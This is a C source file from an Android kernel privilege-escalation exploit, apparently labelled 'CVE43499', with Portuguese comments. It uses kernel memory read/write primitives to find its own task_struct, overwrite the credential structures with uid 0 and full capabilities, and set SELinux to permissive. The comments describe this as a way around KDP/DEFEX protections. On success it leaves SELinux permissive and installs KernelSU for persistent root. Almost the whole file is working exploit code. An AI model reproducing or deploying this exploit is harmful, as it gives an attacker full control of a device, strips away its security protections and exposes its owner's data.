#include "common.h"

#include <stdlib.h>
#include <sys/un.h>
#include <unistd.h>
#include <sys/wait.h>

int root_child_done;
uint32_t root_uid_before = 0xffffffff;
uint32_t root_uid_after = 0xffffffff;

#define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
#define ROOT_HOLD_READY_SOCKET "cve43499_roothold"

/* === Offsets do task_struct (6.1.157 via BTF do vmlinux REAL) === */
#define TASK_STRUCT_CRED_OFF      0x838   /* cred @ 2104 */
#define TASK_STRUCT_REAL_CRED_OFF 0x830   /* real_cred @ 2096 */
#define TASK_STRUCT_TASKS_OFF     0x550   /* list_head tasks @ 1360 */
#define TASK_STRUCT_PID_OFF       0x630   /* pid_t pid @ 1584 */
#define TASK_STRUCT_COMM_OFF      0x848   /* char comm[16] @ 2120 */

/* === Offsets da struct cred (6.1.157 via BTF do vmlinux REAL) === */
#define CRED_UID_OFF              0x04    /* kuid_t uid */
#define CRED_GID_OFF              0x08    /* kgid_t gid */
#define CRED_SUID_OFF             0x0c    /* kuid_t suid */
#define CRED_SGID_OFF             0x10    /* kgid_t sgid */
#define CRED_EUID_OFF             0x14    /* kuid_t euid */
#define CRED_EGID_OFF             0x18    /* kgid_t egid */
#define CRED_FSUID_OFF            0x1c    /* kuid_t fsuid */
#define CRED_FSGID_OFF            0x20    /* kgid_t fsgid */
#define CRED_CAP_INHERITABLE_OFF  0x28    /* kernel_cap_t cap_inheritable */
#define CRED_CAP_PERMITTED_OFF    0x30    /* kernel_cap_t cap_permitted */
#define CRED_CAP_EFFECTIVE_OFF    0x38    /* kernel_cap_t cap_effective */
#define CRED_CAP_BSET_OFF         0x40    /* kernel_cap_t cap_bset */
#define CRED_CAP_AMBIENT_OFF      0x48    /* kernel_cap_t cap_ambient */

static int root_read_data(
    int fd, uintptr_t target, void *data, size_t len) {
  return pipe_phys_read_data(fd, target, data, len);
}

static int root_write_data(
    int fd, uintptr_t target, const void *data, size_t len) {
  return pipe_phys_write_data(fd, target, data, len);
}

static int root_read_global(
    int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len) == (ssize_t)len;
}

static int root_write_global(
    int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len) == (ssize_t)len;
}

static int root_read64(
    int fd, uintptr_t target, uint64_t *value) {
  return value && root_read_data(fd, target, value, sizeof(*value));
}

static int root_read32(
    int fd, uintptr_t target, uint32_t *value) {
  return value && root_read_data(fd, target, value, sizeof(*value));
}

static int root_write64(int fd, uintptr_t target, uint64_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

static int root_write32(int fd, uintptr_t target, uint32_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

static int root_write64_exact(int fd, uintptr_t target, uint64_t value) {
  uint64_t readback = 0;
  return root_write64(fd, target, value) &&
         root_read64(fd, target, &readback) && readback == value;
}

static int root_write32_exact(int fd, uintptr_t target, uint32_t value) {
  uint32_t readback = 0;
  return root_write32(fd, target, value) &&
         root_read32(fd, target, &readback) && readback == value;
}

static int root_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }

  struct sockaddr_un sun;
  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", ROOT_SOCKET_PATH);
  int ready = connect(fd, (struct sockaddr *)&sun, sizeof(sun)) == 0;
  close(fd);
  return ready;
}

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    (!defined(APP_ROOT_REF_HOLDER_REQUIRED) || APP_ROOT_REF_HOLDER_REQUIRED)
static int root_hold_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }
  struct sockaddr_un address;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  memcpy(address.sun_path + 1, ROOT_HOLD_READY_SOCKET,
         sizeof(ROOT_HOLD_READY_SOCKET) - 1);
  socklen_t address_length = (socklen_t)(
      offsetof(struct sockaddr_un, sun_path) +
      sizeof(ROOT_HOLD_READY_SOCKET));
  int ready = connect(fd, (struct sockaddr *)&address, address_length) == 0;
  close(fd);
  return ready;
}
#endif

/*
 * Método 1: Scan da stack (heurística original).
 */
static uintptr_t root_get_current_task_stack_scan(int fd) {
  uint64_t sp = 0;
  __asm__ volatile("mov %0, sp" : "=r"(sp));

  for (uint64_t addr = sp & ~0x3f; addr < sp + 0x20000; addr += 8) {
    uint64_t val = 0;
    if (!root_read64(fd, addr, &val)) continue;

    if ((val & 0xffff800000000000ULL) != 0xffff800000000000ULL)
      continue;

    uint64_t cred = 0;
    if (!root_read64(fd, val + TASK_STRUCT_CRED_OFF, &cred)) continue;
    if ((cred & 0xffff800000000000ULL) != 0xffff800000000000ULL)
      continue;

    uint64_t real_cred = 0;
    if (!root_read64(fd, val + TASK_STRUCT_REAL_CRED_OFF, &real_cred)) continue;
    if ((real_cred & 0xffff800000000000ULL) != 0xffff800000000000ULL)
      continue;

    char comm[16] = {0};
    if (root_read_data(fd, val + TASK_STRUCT_COMM_OFF, comm, 15)) {
      if (comm[0] != '\0') {
        pr_info("root current task (stack scan)=%016zx comm=%s\n", val, comm);
        return (uintptr_t)val;
      }
    }

    return (uintptr_t)val;
  }
  return 0;
}

/*
 * Método 2: Task list walk via PID.
 */
static uintptr_t root_get_current_task_pid_walk(int fd) {
  pid_t my_pid = getpid();

  uintptr_t init_task_addr = data_addr(INIT_TASK);

  pr_info("root inline: PID walk looking for pid=%d from init_task=%016zx "
          "(raw=%016zx)\n", my_pid, init_task_addr, (uintptr_t)INIT_TASK);

  uint64_t first_tasks = 0;
  if (!root_read64(fd, init_task_addr + TASK_STRUCT_TASKS_OFF, &first_tasks)) {
    pr_error("root inline: failed to read init_task.tasks at %016zx\n",
             init_task_addr + TASK_STRUCT_TASKS_OFF);
    if (!root_read_global(fd, init_task_addr + TASK_STRUCT_TASKS_OFF, 
                          &first_tasks, sizeof(first_tasks))) {
      pr_error("root inline: configfs fallback also failed\n");
      return 0;
    }
    pr_info("root inline: configfs fallback read ok, first_tasks=%016zx\n",
            first_tasks);
  }

  pr_info("root inline: init_task.tasks.next=%016zx\n", first_tasks);

  uintptr_t current_tasks = first_tasks;
  const int max_iter = 20000;

  for (int i = 0; i < max_iter; i++) {
    uintptr_t task = current_tasks - TASK_STRUCT_TASKS_OFF;

    if ((task & 0xffff800000000000ULL) != 0xffff800000000000ULL) {
      pr_error("root inline: task list corrupted at iter=%d task=%016zx\n", i, task);
      return 0;
    }

    uint32_t pid = 0;
    if (root_read32(fd, task + TASK_STRUCT_PID_OFF, &pid)) {
      if ((pid_t)pid == my_pid) {
        char comm[16] = {0};
        root_read_data(fd, task + TASK_STRUCT_COMM_OFF, comm, 15);
        pr_info("root inline: found task via PID walk: %016zx pid=%d comm=%s\n",
                task, pid, comm);
        return task;
      }
    }

    if (i < 10) {
      char comm[16] = {0};
      root_read_data(fd, task + TASK_STRUCT_COMM_OFF, comm, 15);
      pr_info("root inline: walk[%d] task=%016zx pid=%d comm=%s\n", i, task, pid, comm);
    }

    uint64_t next_tasks = 0;
    if (!root_read64(fd, current_tasks, &next_tasks)) {
      pr_error("root inline: failed to read next tasks at %016zx\n", current_tasks);
      return 0;
    }

    if (next_tasks == first_tasks || next_tasks == 0) {
      break;
    }
    current_tasks = next_tasks;
  }

  pr_error("root inline: PID %d not found in task list (tried %d tasks)\n",
           my_pid, max_iter);
  return 0;
}

static uintptr_t root_get_current_task(int fd) {
  uintptr_t task = 0;

  task = root_get_current_task_pid_walk(fd);
  if (task) return task;

  pr_info("root inline: PID walk failed, trying stack scan fallback\n");
  task = root_get_current_task_stack_scan(fd);
  if (task) return task;

  return 0;
}

/*
 * Modifica o cred existente do processo para root.
 * NÃO usa init_cred (protegido por KDP/DEFEX).
 */
static int root_patch_cred(int fd, uintptr_t cred_addr, const char *name) {
  if (!cred_addr) {
    pr_error("root inline: %s is NULL\n", name);
    return 0;
  }

  /* Sanity: cred deve estar em kernel space */
  if ((cred_addr & 0xffff800000000000ULL) != 0xffff800000000000ULL) {
    pr_error("root inline: %s looks invalid: %016zx\n", name, cred_addr);
    return 0;
  }

  pr_info("root inline: patching %s at %016zx\n", name, cred_addr);

  /* Ler cred atual pra debug */
  uint32_t old_uid = 0, old_gid = 0, old_euid = 0;
  root_read32(fd, cred_addr + CRED_UID_OFF, &old_uid);
  root_read32(fd, cred_addr + CRED_GID_OFF, &old_gid);
  root_read32(fd, cred_addr + CRED_EUID_OFF, &old_euid);
  pr_info("root inline: %s before uid=%d gid=%d euid=%d\n",
          name, old_uid, old_gid, old_euid);

  /* Escrever uid=0, gid=0, euid=0, egid=0, suid=0, sgid=0, fsuid=0, fsgid=0 */
  int ok = 1;
  ok &= root_write32_exact(fd, cred_addr + CRED_UID_OFF, 0);
  ok &= root_write32_exact(fd, cred_addr + CRED_GID_OFF, 0);
  ok &= root_write32_exact(fd, cred_addr + CRED_SUID_OFF, 0);
  ok &= root_write32_exact(fd, cred_addr + CRED_SGID_OFF, 0);
  ok &= root_write32_exact(fd, cred_addr + CRED_EUID_OFF, 0);
  ok &= root_write32_exact(fd, cred_addr + CRED_EGID_OFF, 0);
  ok &= root_write32_exact(fd, cred_addr + CRED_FSUID_OFF, 0);
  ok &= root_write32_exact(fd, cred_addr + CRED_FSGID_OFF, 0);

  if (!ok) {
    pr_error("root inline: %s uid/gid write failed\n", name);
    return 0;
  }

  /* Setar todas as capabilities para ~0 (tudo permitido) */
  uint64_t all_caps = ~0ULL;
  ok &= root_write64_exact(fd, cred_addr + CRED_CAP_INHERITABLE_OFF, all_caps);
  ok &= root_write64_exact(fd, cred_addr + CRED_CAP_PERMITTED_OFF, all_caps);
  ok &= root_write64_exact(fd, cred_addr + CRED_CAP_EFFECTIVE_OFF, all_caps);
  ok &= root_write64_exact(fd, cred_addr + CRED_CAP_BSET_OFF, all_caps);
  ok &= root_write64_exact(fd, cred_addr + CRED_CAP_AMBIENT_OFF, all_caps);

  if (!ok) {
    pr_error("root inline: %s capabilities write failed\n", name);
    return 0;
  }

  /* Verificar readback */
  uint32_t new_uid = 0xdeadbeef;
  uint64_t new_cap = 0xdeadbeefdeadbeefULL;
  root_read32(fd, cred_addr + CRED_UID_OFF, &new_uid);
  root_read64(fd, cred_addr + CRED_CAP_EFFECTIVE_OFF, &new_cap);
  pr_info("root inline: %s after uid=%d cap_effective=%016zx\n",
          name, new_uid, new_cap);

  return 1;
}

/*
 * Inline root escalation — modifica cred existente (evita KDP/DEFEX).
 */
static int install_inline_root(int fd) {
  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  uint8_t permissive = 0;
  uint8_t selinux_old = 0;
  uint8_t selinux_readback = 0;
  int selinux_changed = 0;
  int result = 0;

  int selinux_read = root_read_global(
      fd, selinux_addr, &selinux_old, sizeof(selinux_old));
  if (!selinux_read) {
    pr_error("root selinux read failed direct=%016zx virtual=%016zx\n",
             selinux_addr, text_addr(SELINUX_ENFORCING));
    return 0;
  }
  if (selinux_old > 1) {
    pr_error("root bad selinux old=%u\n", selinux_old);
    return 0;
  }
  pr_info("root selinux addr=%016zx old=%u\n", selinux_addr, selinux_old);

  if (selinux_old != permissive) {
    selinux_changed = 1;
    if (!root_write_global(fd, selinux_addr, &permissive,
                           sizeof(permissive)) ||
        !root_read_global(fd, selinux_addr, &selinux_readback,
                          sizeof(selinux_readback)) ||
        selinux_readback != permissive) {
      pr_error("root selinux write/readback failed now=%u\n",
               selinux_readback);
      goto cleanup;
    }
    pr_info("root selinux disabled\n");
  }

  /* === 1. Achar o proprio task_struct === */
  uintptr_t current_task = root_get_current_task(fd);
  if (!current_task) {
    pr_error("root inline: failed to find current task_struct\n");
    goto cleanup;
  }
  pr_info("root inline: current_task=%016zx\n", current_task);

  /* === 2. Ler ponteiros cred e real_cred atuais === */
  uint64_t cred_ptr = 0, real_cred_ptr = 0;
  if (!root_read64(fd, current_task + TASK_STRUCT_CRED_OFF, &cred_ptr) ||
      !root_read64(fd, current_task + TASK_STRUCT_REAL_CRED_OFF, &real_cred_ptr)) {
    pr_error("root inline: failed to read cred pointers\n");
    goto cleanup;
  }
  pr_info("root inline: current cred=%016zx real_cred=%016zx\n",
          cred_ptr, real_cred_ptr);

  /* === 3. Patch cred === */
  if (!root_patch_cred(fd, cred_ptr, "cred")) {
    goto cleanup;
  }

  /* === 4. Patch real_cred === */
  if (real_cred_ptr != cred_ptr) {
    if (!root_patch_cred(fd, real_cred_ptr, "real_cred")) {
      goto cleanup;
    }
  } else {
    pr_info("root inline: real_cred == cred, skipping duplicate patch\n");
  }

  /* === 5. Aplicar no userspace === */
  if (setuid(0) != 0) {
    syscall(__NR_setuid, 0);
  }
  if (setgid(0) != 0) {
    syscall(__NR_setgid, 0);
  }

  if (getuid() != 0 || geteuid() != 0) {
    pr_error("root inline: setuid failed uid=%d euid=%d\n", getuid(), geteuid());
    goto cleanup;
  }
  pr_info("root inline: UID=0 GID=0 achieved\n");

  /* === 6. Instalar KernelSU === */
  const char *ksud_path = "/data/local/tmp/ksud";
  if (access(ksud_path, X_OK) == 0) {
    pr_info("root inline: installing KernelSU via %s\n", ksud_path);
    int ret = system("chmod 755 /data/local/tmp/ksud && /data/local/tmp/ksud install");
    if (ret == 0) {
      pr_info("root inline: KernelSU installed successfully\n");
      result = 1;
    } else {
      pr_error("root inline: ksud install failed ret=%d\n", ret);
    }
  } else {
    pr_info("root inline: ksud not found, root achieved without permanent install\n");
    result = 1;
  }

  if (result) {
    int sock = socket(AF_UNIX, SOCK_STREAM, 0);
    if (sock >= 0) {
      struct sockaddr_un sun;
      memset(&sun, 0, sizeof(sun));
      sun.sun_family = AF_UNIX;
      snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", ROOT_SOCKET_PATH);
      unlink(ROOT_SOCKET_PATH);
      if (bind(sock, (struct sockaddr *)&sun, sizeof(sun)) == 0) {
        listen(sock, 1);
        int client = accept(sock, NULL, NULL);
        if (client >= 0) close(client);
      }
      close(sock);
      unlink(ROOT_SOCKET_PATH);
    }
  }

cleanup:
  if (selinux_changed && !result) {
    uint8_t current = 0xff;
    int read_ok = root_read_global(fd, selinux_addr, &current,
                                   sizeof(current));
    int restore_ok = read_ok &&
        (current == selinux_old ||
         (current == permissive &&
          root_write_global(fd, selinux_addr, &selinux_old,
                            sizeof(selinux_old)) &&
          root_read_global(fd, selinux_addr, &current, sizeof(current)) &&
          current == selinux_old));
    pr_info("root selinux rollback=%d old=%u now=%u\n",
            restore_ok, selinux_old, current);
    if (!restore_ok) {
      pr_error("root selinux rollback failed\n");
    }
  } else if (result) {
    pr_info("root selinux left permissive old=%u\n", selinux_old);
  }

  root_child_done = result;
  root_uid_after = result ? 0 : root_uid_before;
  return result;
}

static int install_forkexec_root(int fd) {
  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  uint8_t permissive = 0;
  uint8_t selinux_old = 0;
  uint8_t selinux_readback = 0;
  int selinux_changed = 0;
  int socket_ok = 0;
  int result = 0;

  const char *root_umh_path = ROOT_UMH_PATH;
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  const char *app_root_umh_path = getenv("CVE43499_ROOT_HELPER");
  if (!app_root_umh_path || app_root_umh_path[0] != '/') {
    pr_error("root umh missing CVE43499_ROOT_HELPER\n");
    return 0;
  }
  root_umh_path = app_root_umh_path;
#endif

  if (strlen(root_umh_path) >= 256) {
    pr_error("root umh helper path too long\n");
    return 0;
  }

  int selinux_read = root_read_global(
      fd, selinux_addr, &selinux_old, sizeof(selinux_old));
  if (!selinux_read) {
    pr_error("root selinux read failed direct=%016zx virtual=%016zx\n",
             selinux_addr, text_addr(SELINUX_ENFORCING));
    return 0;
  }
  if (selinux_old > 1) {
    pr_error("root bad selinux old=%u\n", selinux_old);
    return 0;
  }
  pr_info("root selinux addr=%016zx old=%u\n", selinux_addr, selinux_old);

  unlink(ROOT_SOCKET_PATH);

  if (selinux_old != permissive) {
    selinux_changed = 1;
    if (!root_write_global(fd, selinux_addr, &permissive,
                           sizeof(permissive)) ||
        !root_read_global(fd, selinux_addr, &selinux_readback,
                          sizeof(selinux_readback)) ||
        selinux_readback != permissive) {
      pr_error("root selinux write/readback failed now=%u\n",
               selinux_readback);
      goto cleanup;
    }
    pr_info("root selinux disabled\n");
  }

  char uid_str[16];
  snprintf(uid_str, sizeof(uid_str), "%u", getuid());

  pid_t pid = fork();
  if (pid < 0) {
    pr_error("root fork failed\n");
    goto cleanup;
  }

  if (pid == 0) {
    char *argv[] = {
      (char *)root_umh_path,
      (char *)"--umh",
      uid_str,
      NULL
    };
    char *envp[] = { NULL };
    execve(root_umh_path, argv, envp);
    _exit(127);
  }

  for (int i = 0; i < 300; i++) {
    if (root_socket_ready()) {
      socket_ok = 1;
      break;
    }
    int status;
    if (waitpid(pid, &status, WNOHANG) == pid) {
      pr_error("root helper exited early status=%d\n", WEXITSTATUS(status));
      break;
    }
    usleep(10000);
  }

  if (!socket_ok) {
    pr_error("root helper socket timeout\n");
  }

  result = socket_ok;

  if (!socket_ok) {
    kill(pid, SIGKILL);
    waitpid(pid, NULL, 0);
  }

cleanup:
  if (selinux_changed && !result) {
    uint8_t current = 0xff;
    int read_ok = root_read_global(fd, selinux_addr, &current,
                                   sizeof(current));
    int restore_ok = read_ok &&
        (current == selinux_old ||
         (current == permissive &&
          root_write_global(fd, selinux_addr, &selinux_old,
                            sizeof(selinux_old)) &&
          root_read_global(fd, selinux_addr, &current, sizeof(current)) &&
          current == selinux_old));
    pr_info("root selinux rollback=%d old=%u now=%u\n",
            restore_ok, selinux_old, current);
    if (!restore_ok) {
      pr_error("root selinux rollback failed\n");
    }
  } else if (result) {
    pr_info("root selinux left permissive old=%u\n", selinux_old);
  }

  root_child_done = socket_ok;
  root_uid_after = socket_ok ? 0 : root_uid_before;
  return result;
}

int install_android_root(int fd) {
  root_uid_before = getuid();
  pr_info("root configfs-pipe start uid=%u fd=%d\n", root_uid_before, fd);

  int result = install_inline_root(fd);
  if (!result) {
    pr_info("root inline failed, trying fork+exec fallback\n");
    result = install_forkexec_root(fd);
  }

  pr_info("root result=%d uid_before=%u uid_after=%u done=%d\n",
          result, root_uid_before, root_uid_after, root_child_done);
  return result;
}

